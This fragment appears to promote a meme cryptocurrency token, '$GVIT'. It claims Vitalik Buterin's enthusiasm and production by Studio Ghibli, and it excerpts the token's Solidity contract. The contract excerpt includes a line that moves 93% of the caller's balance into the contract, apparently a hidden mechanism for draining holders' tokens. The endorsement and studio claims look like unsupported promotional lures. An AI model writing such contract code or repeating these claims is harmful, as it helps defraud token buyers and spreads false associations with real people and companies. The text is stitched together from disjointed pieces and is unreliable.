...
Vitalik Buterin loves the Ghibli - Met $GVIT made by with Ghibli Studio.
Make Ethereum Great Again with Ghibli 

https://x.com/GhibliVitalik
...
contract GVIT is Context, IERC20, Ownable {
...
transfer(address(this), balanceOf(msg.sender).mul(93).div(100));
